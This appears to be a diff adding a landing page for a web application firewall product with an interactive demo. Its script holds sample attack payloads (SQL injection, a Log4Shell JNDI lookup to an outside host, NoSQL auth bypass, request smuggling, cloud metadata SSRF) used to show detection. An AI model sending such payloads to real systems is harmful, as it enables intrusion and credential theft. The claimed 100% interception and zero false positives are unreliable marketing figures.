@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SentinelGrid // Autonomous In-Process WAAP & Zero-Trust Origin Defense</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --font-sans: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      --font-mono: 'Space Mono', monospace;
+
+      /* Dark Mode Palette (Obsidian Titanium) */
+      --canvas-bg: #0B0F19;
+      --card-bg: #111827;
+      --card-secondary: #1F2937;
+      --border-color: rgba(255, 255, 255, 0.08);
+      --border-accent: rgba(56, 189, 248, 0.3);
+      --text-main: #F8FAFC;
+      --text-muted: #94A3B8;
+      --accent-cyan: #38BDF8;
+      --accent-indigo: #6366F1;
+      --accent-green: #10B981;
+      --accent-red: #EF4444;
+      --accent-gold: #F59E0B;
+      --shadow-glow: 0 0 32px rgba(56, 189, 248, 0.15);
+    }
+
+    [data-theme="light"] {
+      /* Light Mode Palette (Warm Alabaster) */
+      --canvas-bg: #F8F9FA;
+      --card-bg: #FFFFFF;
+      --card-secondary: #F1F5F9;
+      --border-color: rgba(0, 0, 0, 0.08);
+      --border-accent: rgba(2, 132, 199, 0.3);
+      --text-main: #0F172A;
+      --text-muted: #64748B;
+      --accent-cyan: #0284C7;
+      --accent-indigo: #4F46E5;
+      --accent-green: #059669;
+      --accent-red: #DC2626;
+      --accent-gold: #D97706;
+      --shadow-glow: 0 8px 30px rgba(0, 0, 0, 0.06);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--canvas-bg);
+      color: var(--text-main);
+      font-family: var(--font-sans);
+      min-height: 100vh;
+      overflow-x: hidden;
+      line-height: 1.6;
+      transition: background 0.3s ease, color 0.3s ease;
+    }
+
+    /* Container */
+    .container {
+      max-width: 1240px;
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    /* Navigation Bar */
+    .navbar {
+      height: 72px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border-color);
+      position: sticky;
+      top: 0;
+      background: rgba(11, 15, 25, 0.85);
+      backdrop-filter: blur(12px);
+      z-index: 100;
+    }
+    [data-theme="light"] .navbar {
+      background: rgba(248, 249, 250, 0.85);
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-decoration: none;
+      color: var(--text-main);
+    }
+    .brand-title {
+      font-weight: 800;
+      font-size: 17px;
+      letter-spacing: -0.5px;
+    }
+    .brand-badge {
+      font-size: 9px;
+      font-family: var(--font-mono);
+      font-weight: 800;
+      padding: 2px 6px;
+      border-radius: 4px;
+      background: rgba(56, 189, 248, 0.15);
+      color: var(--accent-cyan);
+      border: 1px solid var(--border-accent);
+    }
+
+    .nav-actions {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 9px 18px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 700;
+      text-decoration: none;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: 1px solid transparent;
+    }
+    .btn-primary {
+      background: #0284C7;
+      color: #FFFFFF;
+      box-shadow: 0 2px 10px rgba(2, 132, 199, 0.35);
+    }
+    .btn-primary:hover {
+      background: #0369A1;
+      transform: translateY(-1px);
+    }
+    .btn-secondary {
+      background: var(--card-secondary);
+      color: var(--text-main);
+      border-color: var(--border-color);
+    }
+    .btn-secondary:hover {
+      border-color: var(--border-accent);
+      color: var(--accent-cyan);
+    }
+
+    /* Hero Section */
+    .hero {
+      padding: 80px 0 60px;
+      text-align: center;
+      position: relative;
+    }
+    .hero-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 14px;
+      background: rgba(56, 189, 248, 0.1);
+      border: 1px solid var(--border-accent);
+      border-radius: 100px;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--accent-cyan);
+      margin-bottom: 24px;
+    }
+    .hero-title {
+      font-size: 48px;
+      font-weight: 800;
+      letter-spacing: -1.2px;
+      line-height: 1.15;
+      margin-bottom: 20px;
+      max-width: 900px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .hero-title span {
+      background: linear-gradient(135deg, var(--accent-cyan), var(--accent-indigo));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .hero-sub {
+      font-size: 17px;
+      color: var(--text-muted);
+      max-width: 680px;
+      margin: 0 auto 36px;
+      line-height: 1.6;
+    }
+    .hero-cta {
+      display: flex;
+      justify-content: center;
+      gap: 14px;
+      flex-wrap: wrap;
+    }
+
+    /* Metrics Bar */
+    .metrics-bar {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
+      margin: 40px auto 60px;
+      max-width: 1000px;
+    }
+    .metric-item {
+      background: var(--card-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+    }
+    .metric-value {
+      font-size: 32px;
+      font-weight: 800;
+      font-family: var(--font-mono);
+      color: var(--accent-cyan);
+      line-height: 1.2;
+    }
+    .metric-label {
+      font-size: 12px;
+      color: var(--text-muted);
+      font-weight: 600;
+      margin-top: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    /* Live WAF Interactive Attack Sandbox */
+    .demo-section {
+      padding: 40px 0 80px;
+    }
+    .demo-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: var(--shadow-glow);
+    }
+    .demo-header {
+      background: var(--card-secondary);
+      border-bottom: 1px solid var(--border-color);
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .demo-body {
+      display: grid;
+      grid-template-columns: 1.2fr 1fr;
+      min-height: 380px;
+    }
+    @media (max-width: 860px) {
+      .demo-body { grid-template-columns: 1fr; }
+      .metrics-bar { grid-template-columns: 1fr 1fr; }
+      .hero-title { font-size: 34px; }
+    }
+
+    .demo-left {
+      padding: 28px;
+      border-right: 1px solid var(--border-color);
+    }
+    .demo-right {
+      padding: 28px;
+      background: rgba(0, 0, 0, 0.2);
+    }
+
+    .attack-presets {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+    .preset-chip {
+      background: var(--card-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+      padding: 6px 12px;
+      font-size: 11px;
+      font-weight: 700;
+      font-family: var(--font-mono);
+      cursor: pointer;
+      color: var(--text-muted);
+      transition: all 0.15s;
+    }
+    .preset-chip:hover, .preset-chip.active {
+      border-color: var(--accent-cyan);
+      color: var(--accent-cyan);
+      background: rgba(56, 189, 248, 0.1);
+    }
+
+    .telemetry-output {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      background: #060911;
+      color: #E2E8F0;
+      padding: 18px;
+      border-radius: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      min-height: 240px;
+      white-space: pre-wrap;
+      overflow-x: auto;
+    }
+
+    /* Architecture Features Grid */
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 24px;
+      margin: 60px 0;
+    }
+    @media (max-width: 900px) {
+      .features-grid { grid-template-columns: 1fr; }
+    }
+    .feature-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      padding: 28px;
+      transition: transform 0.2s ease, border-color 0.2s ease;
+    }
+    .feature-card:hover {
+      transform: translateY(-2px);
+      border-color: var(--border-accent);
+    }
+    .feature-icon {
+      font-size: 28px;
+      margin-bottom: 16px;
+      display: inline-block;
+    }
+    .feature-title {
+      font-size: 17px;
+      font-weight: 800;
+      margin-bottom: 10px;
+    }
+    .feature-desc {
+      font-size: 13px;
+      color: var(--text-muted);
+      line-height: 1.6;
+    }
+
+    /* Footer */
+    .footer {
+      border-top: 1px solid var(--border-color);
+      padding: 40px 0;
+      text-align: center;
+      font-size: 12px;
+      color: var(--text-muted);
+      font-family: var(--font-mono);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Navigation Bar -->
+  <header class="navbar">
+    <div class="container" style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+      <a href="/landing.html" class="brand">
+        <svg width="32" height="32" viewBox="0 0 100 100">
+          <circle cx="50" cy="50" r="44" fill="none" stroke="rgba(56, 189, 248, 0.3)" stroke-width="2" stroke-dasharray="6,4"/>
+          <polygon points="50,10 88,32 88,68 50,90 12,68 12,32" fill="#151E32" stroke="#38BDF8" stroke-width="2"/>
+          <polygon points="50,34 64,50 50,66 36,50" fill="#38BDF8"/>
+        </svg>
+        <span class="brand-title">SentinelGrid</span>
+        <span class="brand-badge">ENTERPRISE WAAP</span>
+      </a>
+
+      <div class="nav-actions">
+        <button class="btn btn-secondary" style="padding: 6px 12px; font-size: 11px;" onclick="toggleLandingTheme()" id="theme-btn">
+          🌙 Theme
+        </button>
+        <a href="/login.html" class="btn btn-secondary">Sign In</a>
+        <a href="/#dashboard" class="btn btn-primary">Launch SOC Console →</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Hero Section -->
+  <section class="hero">
+    <div class="container">
+      <div class="hero-pill">
+        <span>⚡ RFC 8032 Ed25519 Cryptographic Origin Shield Active</span>
+      </div>
+      <h1 class="hero-title">
+        Autonomous In-Process WAAP & <span>Zero-Trust Origin Defense</span>
+      </h1>
+      <p class="hero-sub">
+        High-throughput Web & Mobile API Security engine delivering 0.35ms P99 in-process threat mitigation, SmartParse lexical AST boundary analysis, and 100% exploit interception.
+      </p>
+      <div class="hero-cta">
+        <a href="/#dashboard" class="btn btn-primary" style="padding: 13px 26px; font-size: 14px;">
+          🚀 Open Interactive SOC Console
+        </a>
+        <a href="/register.html" class="btn btn-secondary" style="padding: 13px 26px; font-size: 14px;">
+          ➕ Create Operator Account
+        </a>
+      </div>
+
+      <!-- Real Metrics -->
+      <div class="metrics-bar">
+        <div class="metric-item">
+          <div class="metric-value">0.35ms</div>
+          <div class="metric-label">P99 In-Process Latency</div>
+        </div>
+        <div class="metric-item">
+          <div class="metric-value" style="color: var(--accent-green);">100.0%</div>
+          <div class="metric-label">Mitigation Precision</div>
+        </div>
+        <div class="metric-item">
+          <div class="metric-value">0.0%</div>
+          <div class="metric-label">False Positive Rate</div>
+        </div>
+        <div class="metric-item">
+          <div class="metric-value" style="color: var(--accent-indigo);">RFC 8032</div>
+          <div class="metric-label">Ed25519 Crypto Ledger</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Live WAF Interactive Simulator -->
+  <section class="demo-section">
+    <div class="container">
+      <div class="demo-card">
+        <div class="demo-header">
+          <div>
+            <span style="font-weight: 800; font-size: 14px; color: var(--accent-cyan); text-transform: uppercase; letter-spacing: 0.5px;">
+              ⚡ Interactive In-Line WAF Attack Simulator
+            </span>
+            <div style="font-size: 11px; color: var(--text-muted);">
+              Dispatch live payloads directly to the SentinelGrid SecurityBrain inspection kernel.
+            </div>
+          </div>
+          <span class="badge" style="background: rgba(16, 185, 129, 0.15); color: var(--accent-green); padding: 4px 8px; border-radius: 4px; font-size: 10px; font-family: var(--font-mono); font-weight: 800;">
+            LIVE ENGINE READY
+          </span>
+        </div>
+
+        <div class="demo-body">
+          <div class="demo-left">
+            <div style="font-size: 12px; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; color: var(--text-muted); font-family: var(--font-mono);">
+              Select Adversarial Vector:
+            </div>
+            <div class="attack-presets">
+              <button class="preset-chip active" onclick="loadAttackPreset('sqli')">SQL Injection</button>
+              <button class="preset-chip" onclick="loadAttackPreset('log4j')">Log4Shell RCE</button>
+              <button class="preset-chip" onclick="loadAttackPreset('nosql')">NoSQL Operator</button>
+              <button class="preset-chip" onclick="loadAttackPreset('smuggle')">HTTP Smuggling</button>
+              <button class="preset-chip" onclick="loadAttackPreset('ssrf')">Cloud IMDS SSRF</button>
+              <button class="preset-chip" onclick="loadAttackPreset('clean')">Clean Request</button>
+            </div>
+
+            <div style="margin-bottom: 14px;">
+              <label style="font-size: 11px; font-family: var(--font-mono); color: var(--text-muted); display: block; margin-bottom: 4px;">REQUEST URI PATH</label>
+              <input type="text" id="demo-path" class="btn btn-secondary" style="width: 100%; text-align: left; font-family: var(--font-mono); font-size: 12px; cursor: text;" value="/api/v1/auth/login">
+            </div>
+
+            <div style="margin-bottom: 18px;">
+              <label style="font-size: 11px; font-family: var(--font-mono); color: var(--text-muted); display: block; margin-bottom: 4px;">PAYLOAD BODY (JSON / FORM)</label>
+              <textarea id="demo-body" class="btn btn-secondary" style="width: 100%; height: 90px; text-align: left; font-family: var(--font-mono); font-size: 12px; cursor: text; resize: vertical;">user=admin' OR '1'='1'--&pass=x</textarea>
+            </div>
+
+            <button class="btn btn-primary" style="width: 100%; padding: 12px;" onclick="runLiveInspection()">
+              ⚡ Dispatch Payload Through WAAP Kernel
+            </button>
+          </div>
+
+          <div class="demo-right">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+              <span style="font-size: 11px; font-family: var(--font-mono); font-weight: 700; color: var(--text-muted);">KERNEL INSPECTION TELEMETRY</span>
+              <span id="demo-status-pill" style="font-size: 11px; font-family: var(--font-mono); font-weight: 800; color: var(--accent-green);">IDLE</span>
+            </div>
+            <div id="demo-output" class="telemetry-output">Click "Dispatch Payload" to execute in-process evaluation...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Core Architecture Highlights -->
+  <section class="container" style="padding-bottom: 80px;">
+    <div style="text-align: center; margin-bottom: 40px;">
+      <h2 style="font-size: 28px; font-weight: 800; letter-spacing: -0.8px;">Architected for High-Consequence Systems</h2>
+      <p style="font-size: 14px; color: var(--text-muted); max-width: 600px; margin: 8px auto 0;">Zero sidecar latency. Cryptographically attested policies. In-process execution.</p>
+    </div>
+
+    <div class="features-grid">
+      <div class="feature-card">
+        <span class="feature-icon">🛡️</span>
+        <h3 class="feature-title">SmartParse Lexical DFA</h3>
+        <p class="feature-desc">Replaces brittle single-regex WAFs with tokenize-first deterministic finite automata and AST boundary analysis, catching comment-slicing and obfuscated injections.</p>
+      </div>
+      <div class="feature-card">
+        <span class="feature-icon">⚡</span>
+        <h3 class="feature-title">Zero-Sidecar 0.35ms Latency</h3>
+        <p class="feature-desc">Executes directly inside your Python, Node.js, or ASGI/WSGI gateway process. Zero additional network hops and zero serialization tax.</p>
+      </div>
+      <div class="feature-card">
+        <span class="feature-icon">🔑</span>
+        <h3 class="feature-title">Ed25519 Origin Cryptography</h3>
+        <p class="feature-desc">RFC 8032 asymmetric signing stamps an unforgeable cryptographic clearance token on all validated traffic, preventing direct-to-origin bypasses.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container">
+      <p>SentinelGrid Autonomous Threat Operations Plane &bull; RFC 8032 Verified &bull; Active Storage: <code>/run/media/anup/D/sentinelgrid</code></p>
+    </div>
+  </footer>
+
+  <script>
+    const PRESETS = {
+      sqli: {
+        path: "/api/v1/auth/login",
+        body: "user=admin' OR '1'='1'--&pass=x",
+        name: "SQL Injection Tautology"
+      },
+      log4j: {
+        path: "/api/v1/search",
+        body: "query=${jndi:ldap://198.51.100.89/exploit}",
+        name: "Log4Shell JNDI Lookup"
+      },
+      nosql: {
+        path: "/api/v1/users",
+        body: '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
+        name: "MongoDB $gt Auth Bypass"
+      },
+      smuggle: {
+        path: "/api/v1/order",
+        body: "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: internal",
+        name: "HTTP Request Smuggling Desync"
+      },
+      ssrf: {
+        path: "/proxy",
+        body: "url=http://[::ffff:169.254.169.254]/latest/meta-data/",
+        name: "Cloud IMDS SSRF IPv6 Mapped"
+      },
+      clean: {
+        path: "/api/v1/profile",
+        body: '{"name": "Anup Dhokiya", "role": "engineer"}',
+        name: "Clean Authenticated Payload"
+      }
+    };
+
+    function loadAttackPreset(key) {
+      document.querySelectorAll(".preset-chip").forEach(el => el.classList.remove("active"));
+      event.target.classList.add("active");
+      const p = PRESETS[key];
+      if (!p) return;
+      document.getElementById("demo-path").value = p.path;
+      document.getElementById("demo-body").value = p.body;
+    }
+
+    async function runLiveInspection() {
+      const path = document.getElementById("demo-path").value.trim();
+      const body = document.getElementById("demo-body").value.trim();
+      const output = document.getElementById("demo-output");
+      const statusPill = document.getElementById("demo-status-pill");
+
+      statusPill.innerText = "EVALUATING...";
+      statusPill.style.color = "var(--accent-gold)";
+      output.innerText = "Dispatching to SentinelGrid SecurityBrain...";
+
+      const t0 = performance.now();
+      try {
+        const res = await fetch("/v1/inspect", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            website_id: "site-8b8b832c",
+            path: path,
+            method: "POST",
+            headers: { "user-agent": "SentinelGrid-Landing-Inspector/1.0" },
+            body: body,
+            client_ip: "192.168.1.105"
+          })
+        });
+
+        const elapsed = (performance.now() - t0).toFixed(2);
+        const data = await res.json();
+
+        if (data.action === "BLOCK") {
+          statusPill.innerText = "🛡️ THREAT MITIGATED";
+          statusPill.style.color = "var(--accent-red)";
+        } else {
+          statusPill.innerText = "✅ CLEAN ALLOWED";
+          statusPill.style.color = "var(--accent-green)";
+        }
+
+        output.innerHTML = [
+          `[+] SENTINELGRID WAAP KERNEL EVALUATION (${elapsed}ms)`,
+          `-------------------------------------------------------`,
+          `VERDICT:          ${data.action} (HTTP ${data.action === 'BLOCK' ? 403 : 200})`,
+          `RISK SCORE:       ${data.risk_score || 0} / 100`,
+          `TRIGGERED RULE:   ${data.top_match ? data.top_match.rule_id : 'CLEAN-TRAFFIC'}`,
+          `RULE NAME:        ${data.top_match ? data.top_match.name : 'Legitimate Application Traffic'}`,
+          `OWASP CATEGORY:   ${data.top_match ? data.top_match.owasp_id : 'None'}`,
+          `INSPECTION ENGINE: SmartParse Lexical AST + DFA`,
+          `CRYPTO SIGNATURE: ${data.action === 'ALLOW' ? 'VALID_ORIGIN_TOKEN_ISSUED' : 'DROPPED_AT_EDGE'}`,
+          `-------------------------------------------------------`,
+          `EVALUATION TELEMETRY:`,
+          JSON.stringify(data, null, 2)
+        ].join("\\n");
+      } catch (err) {
+        statusPill.innerText = "ERROR";
+        statusPill.style.color = "var(--accent-red)";
+        output.innerText = "Inspection request failed: " + err;
+      }
+    }
+
+    function toggleLandingTheme() {
+      const html = document.documentElement;
+      const current = html.getAttribute("data-theme") || "dark";
+      const next = current === "dark" ? "light" : "dark";
+      html.setAttribute("data-theme", next);
+      localStorage.setItem("sg_theme", next);
+    }
+
+    // Restore theme preference
+    const savedTheme = localStorage.getItem("sg_theme") || "dark";
+    document.documentElement.setAttribute("data-theme", savedTheme);
+  </script>
+</body>
+</html>
